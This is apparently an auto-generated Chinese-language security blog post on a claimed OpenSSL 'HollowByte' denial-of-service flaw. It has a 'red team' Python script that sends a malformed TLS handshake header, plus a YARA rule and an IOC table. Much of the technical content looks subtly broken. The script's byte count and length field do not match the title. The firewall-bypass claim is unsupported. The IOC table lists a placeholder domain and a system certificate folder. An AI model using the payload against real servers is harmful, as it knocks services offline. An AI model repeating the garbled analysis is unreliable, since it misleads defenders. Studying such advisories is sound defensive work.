---
layout: post
title:  "OpenSSL HollowByte Flaw Could Freeze Server Memory with 11-Byte TLS Requests"
date:   2026-07-18 01:50:57 +0000
categories: [security]
severity: medium
---

# ⚠️ 解析 OpenSSL HollowByte 漏洞：利用與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Medium (CVSS: 6.5)
> * **受駭指標**: Denial of Service (DoS)
> * **關鍵技術**: Heap Fragmentation, TLS Handshake, glibc Memory Management

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: OpenSSL 在處理 TLS Handshake 時，會根據客戶端傳送的 header 中的長度字段來分配記憶體。然而，在某些情況下，客戶端可能會傳送一個虛假的長度字段，導致 OpenSSL 分配過多的記憶體，從而導致堆積碎片化。
* **攻擊流程圖解**:
  1. 客戶端傳送一個虛假的 TLS Handshake header，包含一個過大的長度字段。
  2. OpenSSL 根據長度字段分配記憶體。
  3. 客戶端不傳送任何資料，導致 OpenSSL 等待資料的到來。
  4. glibc 的記憶體管理機制會將分配的記憶體進行碎片化，導致記憶體無法被釋放。
* **受影響元件**: OpenSSL 3.0.0 至 3.0.20、3.4.0 至 3.4.5、3.5.0 至 3.5.6、3.6.0 至 3.6.2、4.0.0。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要能夠傳送 TLS Handshake header 的權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    
    # 建構 TLS Handshake header
    header = b'\x16\x03\x03\x00\x01'  # TLS 1.2, Handshake
    header += b'\x00\x00\x00\x00'  # 長度字段
    
    # 傳送 header
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('example.com', 443))
    sock.send(header)
    
    ```
* **繞過技術**: 可以使用 TLS 1.3 的 certificate compression 來繞過某些防火牆的檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /etc/ssl/certs |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule HollowByte {
      meta:
        description = "Detects HollowByte attacks"
      strings:
        $header = { 16 03 03 ?? ?? ?? ?? ?? ?? }
      condition:
        $header at 0
    }
    
    ```
* **緩解措施**: 更新 OpenSSL 至最新版本，並設定 glibc 的記憶體管理機制以避免碎片化。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Fragmentation (堆積碎片化)**: 堆積碎片化是指當程式分配和釋放記憶體時，記憶體空間被分割成小塊，導致記憶體無法被有效利用。
* **TLS Handshake (TLS 握手)**: TLS 握手是指 TLS 通訊協定中，用於建立安全連接的過程。
* **glibc (GNU C 函式庫)**: glibc 是一個 GNU 的 C 函式庫，提供了許多基本的函式和資料結構。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1499/)


